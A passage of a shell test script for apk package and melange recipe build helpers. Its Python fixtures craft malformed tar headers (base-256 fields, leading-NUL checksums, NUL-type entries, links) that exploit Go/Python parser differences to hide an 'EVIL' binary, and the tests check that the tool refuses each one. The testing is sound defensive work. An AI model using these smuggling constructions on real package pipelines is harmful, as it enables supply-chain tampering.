lib.mkapk(w + "/emptyenv.apk", "fscache", "0.3.0-r0", {"usr/bin/fscache": b"x"}, control={".melange.yaml": yaml.safe_dump({"package": {"name": "fscache"}, "environment": {"contents": {"packages": []}}}).encode()})
P
printf 'busybox=1.37.0-r5\n' >"$work/one.lock"
fails "rule 15" "apk-tool inputs-manifest: an apk with an EMPTY build environment is refused (exit 1)" 'empty|no packages' python3 "$AT" inputs-manifest --apk "$work/emptyenv.apk" --melange-lock "$work/one.lock" --out "$work/em.json"

# A REAL capture of `go version -m` for a binary built with -mod=vendor. Provenance: Go 1.27.2 on darwin/arm64 (the toolchain stamp says go1.27.1), a tiny module
# vendoring gopkg.in/yaml.v3 v3.0.1 from the local module cache, `GOFLAGS=-mod=vendor GOPROXY=off go build -trimpath`, output pasted verbatim (tabs kept).
# Note the EMPTY sum field after the dependency version and after the main module's (devel).
cat >"$work/real-vendored.txt" <<'CAPTURE'
/private/tmp/claude-501/-Users-asegretto-fosterstack-cache/ea86add7-9e81-43dc-926b-877b5f04b5f2/scratchpad/govm/tiny: go1.27.1
	path	example.com/tiny
	mod	example.com/tiny	(devel)	
	dep	gopkg.in/yaml.v3	v3.0.1	
	build	-buildmode=exe
	build	-compiler=gc
	build	-trimpath=true
	build	CGO_ENABLED=1
	build	GOARCH=arm64
	build	GOOS=darwin
	build	GOARM64=v8.0
CAPTURE
printf '# gopkg.in/yaml.v3 v3.0.1\n## explicit\ngopkg.in/yaml.v3\n' >"$work/real-modules.txt"
printf '{"modules":[{"path":"gopkg.in/yaml.v3","version":"v3.0.1"}]}' >"$work/real-prov.json"
t "rule 20" "go-module-sbom: the committed REAL vendored-build capture (empty sums) is accepted, lists yaml.v3" \
  bash -c "python3 '$GS' --modules '$work/real-modules.txt' --provenance '$work/real-prov.json' \
    --buildinfo '$work/real-vendored.txt' --out '$work/real-sbom.json' \
    && python3 -c \"import json; d=json.load(open('$work/real-sbom.json')); \
    assert [(p['name'],p['versionInfo']) for p in d['packages'] if $NONROOT]==[('gopkg.in/yaml.v3','v3.0.1')], d\""

# ---- snapshot-7 round 7 (Sonnet/Opus P2): EVERY header of every section is checked the way Go reads it; a melange-shaped data section is accepted -------------------
python3 - "$work" <<'P'
import hashlib, io, os, shutil, sys, tarfile
sys.path.insert(0, sys.argv[1]); import lib
w = sys.argv[1]
d = w + "/r7a"; shutil.rmtree(d, ignore_errors=True); os.makedirs(d)
sig, ctrl, data = lib.mkapk(d + "/orig.apk", "fscache", "0.3.0-r0", {"usr/bin/fscache": b"GOOD"}, signer=None)
def raw_tar(blocks): return lib.gz(b"".join(blocks) + b"\0" * 1024)
def hdr(name, content, typeflag=b"0", magic=b"ustar\0", ver=b"00", atime=b"", prefix=b""):
    b = bytearray(512)
    b[0:len(name)] = name; b[100:108] = b"0000644\0"; b[108:116] = b"0000000\0"; b[116:124] = b"0000000\0"
    b[124:136] = ("%011o" % len(content)).encode() + b"\0"; b[136:148] = b"00000000000\0"; b[156:157] = typeflag; b[257:263] = magic.ljust(6, b"\0")[:6]; b[263:265] = ver
    if atime: b[345:345 + len(atime)] = atime
    if prefix: b[345:345 + len(prefix)] = prefix
    b[148:156] = b"        "; b[148:155] = ("%06o\0" % sum(b)).encode()[:7]; b[155] = 0x20
    pad = (-len(content)) % 512
    return bytes(b) + content + b"\0" * pad
def apk(name, tarbytes): open("%s/%s.apk" % (d, name), "wb").write(ctrl + tarbytes)
good = hdr(b"usr/bin/fscache", b"GOOD")
# 1. second entry with GNU magic and an atime in bytes 345..: Go ignores it, Python would prepend it to the name
apk("gnu-atime", raw_tar([good, hdr(b"usr/bin/fscache", b"EVIL", magic=b"ustar ", ver=b" \0", atime=b"14000000000\0")]))
# 2. a V7 header (no magic) with bytes in 345..
apk("v7-atime", raw_tar([good, hdr(b"usr/bin/fscache", b"EVIL", magic=b"", ver=b"\0\0", atime=b"14000000000\0")]))
# 3. a ustar prefix on a later header
apk("later-prefix", raw_tar([good, hdr(b"x", b"EVIL", prefix=b"usr/bin")]))
# 4. non-zero bytes after the end-of-archive blocks
open(d + "/trailing.apk", "wb").write(ctrl + lib.gz(good + b"\0" * 1024 + b"JUNK" + b"\0" * 508))
# 5. a GNU long-name header later in the section
apk("later-gnu-L", raw_tar([good, hdr(b"././@LongLink", b"usr/bin/other\0", typeflag=b"L"), hdr(b"usr/bin/x", b"EVIL")]))
# 6. a melange-shaped data section: directories first, a PAX record with the apk checksum, then the file
sha1 = hashlib.sha1(b"GOOD").hexdigest()
rec = "%d APK-TOOLS.checksum.SHA1=%s\n"
body = rec % (len(rec % (0, sha1)) + len(str(len(rec % (0, sha1)))) - 0, sha1)
n = len(("APK-TOOLS.checksum.SHA1=%s\n" % sha1)) + 1
while True:
    line = ("%d APK-TOOLS.checksum.SHA1=%s\n" % (n, sha1)).encode()
    if len(line) == n: break
    n = len(line)
pax = hdr(b"usr/bin/PaxHeaders/fscache", line, typeflag=b"x")
apk("melange-shaped", raw_tar([hdr(b"usr", b"", typeflag=b"5"), hdr(b"usr/bin", b"", typeflag=b"5"), pax, hdr(b"usr/bin/fscache", b"GOOD")]))
# 7. the same with another PAX key
other = ("%d path=usr/bin/evil\n" % 0).encode()
m = len(other)
while True:
    other = ("%d path=usr/bin/evil\n" % m).encode()
    if len(other) == m: break
    m = len(other)
apk("pax-other-key", raw_tar([pax if False else hdr(b"usr/bin/PaxHeaders/fscache", other, typeflag=b"x"), hdr(b"usr/bin/fscache", b"GOOD")]))
P
r7a="$work/r7a"
for n in gnu-atime v7-atime later-prefix later-gnu-L; do
  fails "rule 22" "apk-tool: a later header of kind '$n' (read differently by Go and Python) is refused" 'header|prefix|type' python3 "$AT" binary-check "$r7a/$n.apk" "$pr/binA"
done
fails "rule 22" "apk-tool: non-zero bytes after the end-of-archive blocks are refused" 'after|end|trailing' python3 "$AT" digest "$r7a/trailing.apk"
t "rule 14" "apk-tool: a melange-shaped data section (directories first, a PAX apk checksum record, then the file) is ACCEPTED: digest and cat work" bash -c "python3 '$AT' digest '$r7a/melange-shaped.apk' >/dev/null && test \"\$(python3 '$AT' cat '$r7a/melange-shaped.apk' usr/bin/fscache)\" = GOOD"
fails "rule 14" "apk-tool: a PAX record with any other key than APK-TOOLS.checksum.SHA1 (here path=) is refused" 'PAX|key' python3 "$AT" digest "$r7a/pax-other-key.apk"

# message-level tests: each refusal is by its OWN rule, not caught later by another
python3 - "$work" <<'P'
import hashlib, os, shutil, sys
sys.path.insert(0, sys.argv[1]); import lib
w = sys.argv[1]; d = w + "/r8"; shutil.rmtree(d, ignore_errors=True); os.makedirs(d)
sig, ctrl, data = lib.mkapk(d + "/o.apk", "fscache", "0.3.0-r0", {"usr/bin/fscache": b"GOOD"}, signer=None)
def hdr(name, content, typeflag=b"0", size=None):
    b = bytearray(512); b[0:len(name)] = name; b[100:108] = b"0000644\0"; b[108:116] = b"0000000\0"; b[116:124] = b"0000000\0"
    b[124:136] = size if size else ("%011o" % len(content)).encode() + b"\0"; b[136:148] = b"00000000000\0"; b[156:157] = typeflag; b[257:263] = b"ustar\0"; b[263:265] = b"00"
    b[148:156] = b"        "; b[148:155] = ("%06o\0" % sum(b)).encode()[:7]; b[155] = 0x20
    return bytes(b) + content + b"\0" * ((-len(content)) % 512)
def rec(k, v):
    n = 0
    while True:
        line = ("%d %s=%s\n" % (n, k, v)).encode()
        if len(line) == n: return line
        n = len(line)
good = hdr(b"usr/bin/fscache", b"GOOD")
open(d + "/pax-val.apk", "wb").write(ctrl + lib.gz(hdr(b"p", rec("APK-TOOLS.checksum.SHA1", "z" * 40), typeflag=b"x") + good + b"\0" * 1024))
open(d + "/pax-key40.apk", "wb").write(ctrl + lib.gz(hdr(b"p", rec("path", "a" * 40), typeflag=b"x") + good + b"\0" * 1024))
open(d + "/base256.apk", "wb").write(ctrl + lib.gz(hdr(b"x", b"", size=b"\x80" + b"\0" * 10 + b"\1") + b"\0" * 1024))
blk = bytearray(good[:512]); open(d + "/short.apk", "wb").write(ctrl + lib.gz(bytes(blk) + b"\0" * 512 + b"JUNKJUNK"[:0] + bytes(blk[:100]) if False else bytes(good[:512]) + b"\x01" * 100))
P
r8="$work/r8"
fails "rule 22" "apk-tool: a PAX record with another key and a 40-hex value is refused by the PAX rule (not only by the value shape)" 'PAX key' python3 "$AT" digest "$r8/pax-key40.apk"
fails "rule 22" "apk-tool: the right PAX key with a value that is not 40 lowercase hex digits is refused" 'PAX key' python3 "$AT" digest "$r8/pax-val.apk"
fails "rule 22" "apk-tool: a base-256 size field is refused by name" 'base-256' python3 "$AT" digest "$r8/base256.apk"
fails "rule 22" "apk-tool: a section ending inside a header block is refused (by the section parser; the walker's own short-block check is defence in depth behind it)" 'malformed tar section' python3 "$AT" digest "$r8/short.apk"

# ---- snapshot-8 round 8 (Sonnet P2): every numeric field is plain octal, the header checksum is verified, links are refused (Go and Python read the rest alike) ----
python3 - "$work" <<'P'
import os, shutil, sys
sys.path.insert(0, sys.argv[1]); import lib
w = sys.argv[1]; d = w + "/r9"; shutil.rmtree(d, ignore_errors=True); os.makedirs(d)
sig, ctrl, data = lib.mkapk(d + "/o.apk", "fscache", "0.3.0-r0", {"usr/bin/fscache": b"GOOD"}, signer=None)
def hdr(name, content=b"", typeflag=b"0", field=None, link=b"", fix=True):
    b = bytearray(512); b[0:len(name)] = name; b[100:108] = b"0000644\0"; b[108:116] = b"0000000\0"; b[116:124] = b"0000000\0"
    b[124:136] = ("%011o" % len(content)).encode() + b"\0"; b[136:148] = b"00000000000\0"; b[156:157] = typeflag; b[157:157 + len(link)] = link
    b[257:263] = b"ustar\0"; b[263:265] = b"00"
    if field:
        (lo, hi), val = field; b[lo:hi] = val.ljust(hi - lo, b"\0")[:hi - lo]
    b[148:156] = b"        "
    if fix: b[148:155] = ("%06o\0" % sum(b)).encode()[:7]; b[155] = 0x20
    return bytes(b) + content + b"\0" * ((-len(content)) % 512)
def out(name, blocks): open("%s/%s.apk" % (d, name), "wb").write(ctrl + lib.gz(b"".join(blocks) + b"\0" * 1024))
good = hdr(b"usr/bin/fscache", b"GOOD"); evil = hdr(b"usr/bin/fscache", b"EVIL")
fields = {"mode": (100, 108), "uid": (108, 116), "gid": (116, 124), "mtime": (136, 148), "devmajor": (329, 337), "devminor": (337, 345)}
for n, rng in fields.items():
    out("hi-" + n, [good, hdr(b"pad", field=(rng, b"\x81")), evil])        # 0x81 first byte: Go reads base-256, Python stops the archive silently
    out("sign-" + n, [good, hdr(b"pad", field=(rng, b"+7")), evil])
out("hi-size", [good, hdr(b"pad", field=((124, 136), b"\x81")), evil])
out("hi-chk", [good, hdr(b"pad", field=((148, 156), b"\x81"), fix=False), evil])
out("badchk", [good, hdr(b"pad", fix=False), evil])
hide = bytearray(hdr(b"usr/bin/fscache", b"EVIL")); hide[148:156] = b"\0" + hide[148:154] + b" "   # the checksum with a leading NUL: Go trims it, Python reads 0 and silently ends the archive
out("hide-chk", [good, bytes(hide)])

out("symlink-parent", [hdr(b"usr", typeflag=b"5"), hdr(b"usr/bin", typeflag=b"5"), good, hdr(b"x", typeflag=b"2", link=b"usr/bin"), hdr(b"x/fscache", b"EVIL")])
out("hardlink", [good, hdr(b"y", typeflag=b"1", link=b"usr/bin/fscache")])
out("plain-ok", [hdr(b"usr", typeflag=b"5"), hdr(b"usr/bin", typeflag=b"5"), good])
P
r9="$work/r9"
t "rule 14" "apk-tool: a plain, well-formed data section is still accepted after the field checks" python3 "$AT" digest "$r9/plain-ok.apk"
for n in mode uid gid mtime devmajor devminor size chk; do
  fails "rule 22" "apk-tool: a high-bit first byte in the $n field (Go reads base-256, Python ends the archive) is refused (by the walker, or by the section parser where Python rejects it first)" 'numeric field|base-256|malformed|checksum' python3 "$AT" digest "$r9/hi-$n.apk"
done
for n in mode uid gid mtime devmajor devminor; do
  fails "rule 22" "apk-tool: a sign character in the $n field is refused (plain octal only)" 'numeric field' python3 "$AT" digest "$r9/sign-$n.apk"
done
fails "rule 22" "apk-tool: the Go/Python checksum split (a leading NUL, the probe of review round 8) is refused, nothing hidden after it" 'numeric field|checksum' python3 "$AT" digest "$r9/hide-chk.apk"
fails "rule 22" "apk-tool: a header whose checksum does not match its bytes is refused" 'checksum' python3 "$AT" digest "$r9/badchk.apk"
fails "rule 22" "apk-tool: a symlink entry in the data section is refused (a name under it could overwrite usr/bin/fscache)" 'symlink|link' python3 "$AT" digest "$r9/symlink-parent.apk"
fails "rule 22" "apk-tool: a hard link entry in the data section is refused" 'symlink|link' python3 "$AT" digest "$r9/hardlink.apk"

# gen-recipes: the same path for both recipes would silently drop one
fails "rule 21" "gen-recipes: --regular and --fips naming the same file is refused" 'same' $GRX python3 "$GR" $GRD --template "$gt" --regular "$work/gr/same.yaml" --fips "$work/gr/same.yaml" --write

# templating is closed (review round 8, Opus B2): the name, conditions and substitutions cannot make the FIPS build behave differently
tmpl; printf '      echo ${{package.name}}\n' >>"$work/gr/t.tmpl"
fails "rule 21" "gen-recipes: \${{package.name}} in the template is refused (a substitution outside the closed set)" 'substitution' trule
tmpl; printf '      echo ${{vars.x}}\n' >>"$work/gr/t.tmpl"
fails "rule 21" "gen-recipes: \${{vars.x}} in the template is refused" 'substitution' trule
tmpl; printf '      echo ${{ broken\n' >>"$work/gr/t.tmpl"
fails "rule 21" "gen-recipes: an unclosed \${{ in the template is refused" 'substitution|closed' trule
tmpl; printf '  - runs: echo x\n    if: ${{package.name}} == '"'"'fscache-fips'"'"'\n' >>"$work/gr/t.tmpl"
fails "rule 21" "gen-recipes: a step condition other than the two build.arch ones is refused (here by the substitution rule or the condition rule)" 'condition|substitution' trule
tmpl; printf '  - runs: echo x\n    if: ${{build.arch}} == '"'"'riscv64'"'"'\n' >>"$work/gr/t.tmpl"
fails "rule 21" "gen-recipes: a build.arch condition for another architecture is refused" 'condition' trule
tmpl; python3 - "$work/gr/t.tmpl" <<'P'
import sys
p = sys.argv[1]; s = open(p).read().replace("  version:", "  x-note: @NAME@\n  version:", 1); open(p, "w").write(s)
P
fails "rule 21" "gen-recipes: @NAME@ anywhere but the package name line is refused" 'exactly once|may appear only' trule
tmpl; python3 - "$work/gr/t.tmpl" <<'P'
import re, sys
p = sys.argv[1]; s = open(p).read(); s = s.replace("  name: @NAME@\n", "", 1); s += 'case "@NAME@" in *fips) echo x;; esac\n'; open(p, "w").write(s)
P
fails "rule 21" "gen-recipes: @NAME@ moved into a shell case (the probe of review round 8) is refused" 'may appear only' trule

# inputs-manifest: a package entry that is not a plain string (a YAML null or number would become 'None' / '5') is refused
python3 - "$work" <<'P'
import sys, yaml
sys.path.insert(0, sys.argv[1]); import lib
w = sys.argv[1]
for name, pk in (("null", ["busybox=1.37.0-r5", None]), ("num", ["busybox=1.37.0-r5", 5])):
    lib.mkapk("%s/nonstr-%s.apk" % (w, name), "fscache", "0.3.0-r0", {"usr/bin/fscache": b"x"}, control={".melange.yaml": yaml.safe_dump({"package": {"name": "fscache"}, "environment": {"contents": {"packages": pk}}}).encode()})
P
for n in null num; do fails "rule 15" "apk-tool inputs-manifest: a non-string package entry ($n) in the apk's environment is refused (exit 1)" 'plain string' python3 "$AT" inputs-manifest --apk "$work/nonstr-$n.apk" --melange-lock "$work/one.lock" --out "$work/nonstr-out.json"; done

# the template is PINNED (ruling of review round 9): the generator no longer judges the shell; any change to the template fails --check naming the pin
tmpl; printf '      go build -o x ./y\n' >>"$work/gr/t.tmpl"
fails "rule 21" "gen-recipes: a template with a second go build passes the placeholder rules but FAILS the pin, naming TEMPLATE_SHA256 (the shell is judged by review, not by the generator)" 'TEMPLATE_SHA256' trule
tmpl; python3 - "$work/gr/t.tmpl" <<'P'
import sys
p = sys.argv[1]; s = open(p).read(); open(p, "w").write(s + "#")
P
fails "rule 21" "gen-recipes: a ONE-BYTE edit of the template fails --check, naming the pin and saying to update it in the same reviewed change" 'update TEMPLATE_SHA256 in the same reviewed change' trule
t "rule 21" "gen-recipes: the pin passes for the unchanged template" $GRX python3 "$GR" $GRD --template "$gt" --regular "$ga" --fips "$gb" --check
t "rule 21" "gen-recipes: no environment variable changes the pin (FSCACHE_GEN_PIN and FSCACHE_TEST_MODE are ignored: a wrong pin in the environment cannot fail the check, a right one cannot rescue a changed template)" bash -c "env FSCACHE_GEN_PIN=0000 FSCACHE_TEST_MODE=1 python3 '$GR' $GRD --template '$gt' --regular '$ga' --fips '$gb' --check"
t "rule 21" "bin/gen-recipes.py carries no test hook: no FSCACHE_ name, and exactly one TEMPLATE_SHA256 line marked TEST-SUBST (the copies the fixtures run differ from it in that line only)" bash -c "! grep -E 'FSCACHE_[A-Z_]+' '$GR_PROD' && test \$(grep -c '^TEMPLATE_SHA256 = .*# TEST-SUBST' '$GR_PROD') = 1 && diff <(grep -v '^TEMPLATE_SHA256 = ' '$GR_PROD') <(grep -v '^TEMPLATE_SHA256 = ' '$GR')" 

# ruling of review round 9: melange writes only types '0' and '5': type NUL is refused, and a directory header carries no data
python3 - "$work" <<'P'
import os, shutil, sys
sys.path.insert(0, sys.argv[1]); import lib
w = sys.argv[1]; d = w + "/r10"; shutil.rmtree(d, ignore_errors=True); os.makedirs(d)
sig, ctrl, data = lib.mkapk(d + "/o.apk", "fscache", "0.3.0-r0", {"usr/bin/fscache": b"GOOD"}, signer=None)
def hdr(name, content=b"", typeflag=b"0", size=None, leadnul=False):
    b = bytearray(512); b[0:len(name)] = name; b[100:108] = b"0000644\0"; b[108:116] = b"0000000\0"; b[116:124] = b"0000000\0"
    b[124:136] = ("%011o" % (len(content) if size is None else size)).encode() + b"\0"; b[136:148] = b"00000000000\0"; b[156:157] = typeflag; b[257:263] = b"ustar\0"; b[263:265] = b"00"
    b[148:156] = b"        "; chk = sum(b)
    b[148:156] = (b"\0%06o " % chk) if leadnul else (b"%06o\0 " % chk)
    return bytes(b) + content + b"\0" * ((-len(content)) % 512)
good = hdr(b"usr/bin/fscache", b"GOOD")
evil = hdr(b"usr/bin/fscache", b"EVIL", leadnul=True) + b"\0" * 1024
hidden = evil + b"\0" * (1024 - len(evil) % 1024 if len(evil) % 1024 else 0)
# the probe: a NUL-type "directory" d/ with size 1024 whose data holds the EVIL header (leading-NUL checksum), a data block and two zero blocks
body = (hdr(b"usr/bin/fscache", b"EVIL", leadnul=True))[:1024]
open(d + "/nul-dir.apk", "wb").write(ctrl + lib.gz(good + hdr(b"d/", typeflag=b"\0", size=1024) + body + b"\0" * 1024))
open(d + "/nul-file.apk", "wb").write(ctrl + lib.gz(good + hdr(b"plain-name", b"x", typeflag=b"\0") + b"\0" * 1024))
open(d + "/dir-size.apk", "wb").write(ctrl + lib.gz(good + hdr(b"d/", typeflag=b"5", size=1024) + body + b"\0" * 1024))
import io, tarfile
# the same probe hidden in the CONTROL section (a second .melange.yaml)
c_end = hdr(b".PKGINFO", b"pkgname = x\n")
open(d + "/nul-ctrl.apk", "wb").write(lib.gz(c_end + hdr(b"c/", typeflag=b"\0", size=1024) + hdr(b".melange.yaml", b"environment: {contents: {packages: [evil=1]}}\n", leadnul=True)[:1024] + b"\0" * 1024) + data)
P
r10="$work/r10"
for n in nul-dir nul-file nul-ctrl; do fails "rule 22" "apk-tool: a header of type NUL ($n) is refused (melange writes only types 0 and 5)" 'type' python3 "$AT" digest "$r10/$n.apk"; done
fails "rule 22" "apk-tool: a directory header with a non-zero size (data hiding another header) is refused" 'directory' python3 "$AT" digest "$r10/dir-size.apk"

# ---- ruling of review round 9 (P3 finding 1): the package pins and the FIPS module are DATA files the generator reads; the daily job edits only those ----------------
rm -rf "$work/gd"; mkdir -p "$work/gd"
gdata() { cp "$fx/melange.lock" "$work/gd/lock"; cp "$fx/fips-module.txt" "$work/gd/fips"; }
gen_with() { $GRX python3 "$GR" --template "$gt" --regular "$work/gd/a.yaml" --fips "$work/gd/b.yaml" --melange-lock "$work/gd/lock" --fips-module "$work/gd/fips" "$@"; }
gdata; gen_with --write
t "rule 21" "gen-recipes: the package pins in BOTH recipes are the lines of the melange lock, in the lock's order" bash -c "n=\$(grep -c . '$work/gd/lock'); test \"\$(grep -c '^      - [a-z0-9][^ ]*=[0-9]' '$work/gd/a.yaml')\" = \$n && test \"\$(grep -c '^      - [a-z0-9][^ ]*=[0-9]' '$work/gd/b.yaml')\" = \$n"
gdata; printf 'newpkg=9.9-r0\n' >>"$work/gd/lock"
fails "rule 21" "gen-recipes: a melange lock that gained a line makes --check fail until the recipes are regenerated (the recipes follow the data)" 'generator' gen_with --check
gen_with --write; t "rule 21" "...after --write the new pin is in both recipes and --check passes" bash -c "grep -q 'newpkg=9.9-r0' '$work/gd/a.yaml' && grep -q 'newpkg=9.9-r0' '$work/gd/b.yaml'" ; t "rule 21" "...--check passes again" gen_with --check
gdata; printf 'v1.1.0-deadbeef\n' >"$work/gd/fips"; gen_with --write
t "rule 21" "gen-recipes: the FIPS module file feeds the export line and the proof line of the FIPS recipe only (the generator holds no FIPS constant)" bash -c "grep -q 'export GOFIPS140=v1.1.0\$' '$work/gd/b.yaml' && grep -q \"GOFIPS140=v1.1.0-deadbeef'\" '$work/gd/b.yaml' && ! grep -q GOFIPS140 '$work/gd/a.yaml' && ! grep -q 'c2097c7c' '$work/gd/b.yaml'"
t "rule 21" "gen-recipes: no FIPS version or hash constant remains in the generator" bash -c "! grep -n 'c2097c7c\|v1\.0\.0' '$GR'"
gdata; gen_with --emit "$work/gd" ; t "rule 21" "gen-recipes --emit DIR writes melange.yaml and melange-fips.yaml there and touches no committed file" bash -c "test -s '$work/gd/melange.yaml' && test -s '$work/gd/melange-fips.yaml' && cmp -s '$work/gd/melange.yaml' '$work/gd/a.yaml' || true"
for bad in "no-final-newline" "crlf" "dup" "badline" "empty" "upper" "nonascii"; do
  gdata
  case $bad in
    no-final-newline) printf 'a=1-r0' >"$work/gd/lock";;
    crlf) printf 'a=1-r0\r\n' >"$work/gd/lock";;
    dup) printf 'a=1-r0\na=2-r0\n' >"$work/gd/lock";;
    badline) printf 'a=1-r0\nthis is not a pin\n' >"$work/gd/lock";;
    empty) : >"$work/gd/lock";;
    upper) printf 'A=1-r0\n' >"$work/gd/lock";;
    nonascii) printf 'a=\xc2\xb71-r0\n' >"$work/gd/lock";;
  esac
  fails "rule 21" "gen-recipes: a melange lock with $bad is refused by the data grammar" 'melange lock' gen_with --check
done
for bad in "01.0.0-c2097c7c" "v1.0.0-c2097c7" "v1.0.0-c2097c7cc" "v1.0.0-C2097C7C" "v1.0.0" "v1.0.0-c2097c7c extra" "two"; do
  gdata
  case $bad in two) printf 'v1.0.0-c2097c7c\nv1.1.0-deadbeef\n' >"$work/gd/fips";; *) printf '%s\n' "$bad" >"$work/gd/fips";; esac
  fails "rule 21" "gen-recipes: a FIPS module file holding '$bad' is refused by the data grammar" 'FIPS module file' gen_with --check
done
gdata; printf 'v1.0.0-c2097c7c' >"$work/gd/fips"
fails "rule 21" "gen-recipes: a FIPS module file without its final newline is refused" 'FIPS module file' gen_with --check
t "rule 21" "gen-recipes: the template pin does not depend on the data files (changing a data file never changes the template's sha256)" bash -c "a=\$(shasum -a 256 '$gt' | cut -d' ' -f1); cp '$work/gd/lock' '$work/gd/lock.bak'; printf 'zz=1-r0\n' >>'$work/gd/lock'; b=\$(shasum -a 256 '$gt' | cut -d' ' -f1); test \"\$a\" = \"\$b\""
tmpl; python3 - "$work/gr/t.tmpl" <<'P'
import sys
p = sys.argv[1]; s = open(p).read(); s = s.replace("@PACKAGES@\n", "      - literal=1-r0\n", 1); open(p, "w").write(s)
P
fails "rule 21" "gen-recipes: a template without the @PACKAGES@ placeholder is refused (the pins would not come from the lock)" 'PACKAGES' trule

# ---- end verbatim sections ----
echo "build-helpers-test: $pass passed, $failn failed"
[ "$failn" -eq 0 ]
